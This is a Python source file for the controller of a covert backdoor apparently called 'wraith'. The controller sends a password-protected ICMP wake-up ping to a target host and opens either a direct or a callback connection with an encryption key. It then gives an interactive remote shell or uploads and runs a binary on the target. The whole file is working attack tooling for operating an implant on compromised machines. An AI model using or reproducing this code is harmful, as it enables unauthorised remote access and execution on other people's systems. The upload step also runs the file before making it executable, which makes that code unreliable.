#!/bin/env python3

import argparse
import os
import random
import readline
import shlex
import socket
import struct
import sys
import time

from threading import Thread
from wraith import prettyconsole
from wraith.cmd import register_commands
from wraith.icmpclient import IcmpClient
from wraith.s20client import S20Client


class WraithShell:

    def __init__(self, client):
        self._client = client
        self._commands = {}
        register_commands(self)

    def add_command(self, name, handler):
        self._commands[name] = handler

    def repl(self):
        readline.parse_and_bind('tab: complete')
        while True:
            cmd = input("\001\x1B[0;32m\002>> \001\x1B[0m\002")

            if cmd.startswith("."):
                argv = shlex.split(cmd)
                name = argv[0][1:]

                if name in self._commands:
                    cmd_handler = self._commands[name]
                    cmd_handler(self._client, argv)
                else:
                    prettyconsole.print_error("No such builtin!")
            
            elif len(cmd.strip()) > 0:
                self.execute_remote_command(cmd)

    def execute_remote_command(self, cmd):
        self._client.send_command(1, 0, cmd.encode("utf-8"))

        while True:
            msg = self._client.recv_message()

            if msg.opcode != 0x10:
                break

            if msg.payload is not None:
                sys.stdout.buffer.write(msg.payload)

        sys.stdout.flush()


def tcp_connect(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    prettyconsole.print_info("connecting to {0}:{1}".format(host, port))

    try:
        sock.connect((host, port))
    except ConnectionRefusedError:
        prettyconsole.print_error("Connection refused")
        raise SystemExit(-1)

    prettyconsole.print_success("connection established!")

    return sock


def tcp_listen_once(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        prettyconsole.print_info("listening on port {0}".format(port))

        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("0.0.0.0", port))
        listener.listen(1)

        sock, addr = listener.accept()

        prettyconsole.print_success("accepted connection!")

        return sock


def send_wakeup_ping(target_ip, callback_ip, port, password, delay=0):
    icmp_client = IcmpClient(password)

    def wakeup(delay):
        time.sleep(delay)
        icmp_client.send_packet(target_ip, callback_ip, port)

    if callback_ip != "0.0.0.0":
        child_thread = Thread(target=wakeup, args=[10])
        child_thread.start()
    else:
        wakeup(0)


def upload_execute(client, shell, args):
    lfile = args.src
    rfile = args.dst

    with open(lfile, "rb") as fd:
        payload = fd.read()
        prettyconsole.print_info("uploading %d bytes" % len(payload))

    client.send_command(3, 0, struct.pack("256sI", rfile.encode("utf-8"), 700) + payload)
    cmd = "PATH={0}:$PATH {1} ; chmod +x {1}".format(os.path.dirname(rfile), os.path.basename(rfile))
    prettyconsole.print_info("executing binary")
    shell.execute_remote_command(cmd)


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("--password", "-P", required=False, help="Wake-up password")
    parser.add_argument("--callback", "-c", required=False, default="0.0.0.0", help="callback IP")
    parser.add_argument("--key", "-k", required=True, help="Session encryption key")
    parser.add_argument("--port", "-p", help="Listen port", default=0, type=int)

    parser.add_argument("ip", help="Target IP address")

    subparser = parser.add_subparsers(title="subcommands", dest='subparser_name', description="valid subcommands")
    
    shell_parser = subparser.add_parser("shell")

    upload_execute_parser = subparser.add_parser("upload_execute")
    upload_execute_parser.add_argument("--src", "-s", required=True, help="Source file to upload")
    upload_execute_parser.add_argument("--dst", "-d", required=True, help="Destination file")

    args = parser.parse_args()

    target_ip = args.ip
    keystr = args.key
    password = args.password
    port = args.port

    try:
        key = bytes.fromhex(keystr)
    except ValueError:
        prettyconsole.print_error("invalid key specified")
        return

    if port == 0:
        port = random.randint(32768, 61000)

    if password:
        prettyconsole.print_success("sent ICMP wake up command to {0}".format(target_ip))
        prettyconsole.print_info("backdoor will listen on port {0}".format(port))
        send_wakeup_ping(target_ip, args.callback, port, password)
        time.sleep(4)

    client = S20Client(key)

    if args.callback == "0.0.0.0":
        client.wrap_socket(tcp_connect(target_ip, port))
    else:
        client.wrap_socket(tcp_listen_once(port))

    shell = WraithShell(client)

    if args.subparser_name == "shell":
        prettyconsole.print_info("entering interactive shell")
        shell.repl()
    elif args.subparser_name == "upload_execute":
        upload_execute(client, shell, args)


if __name__ == "__main__":
    main()
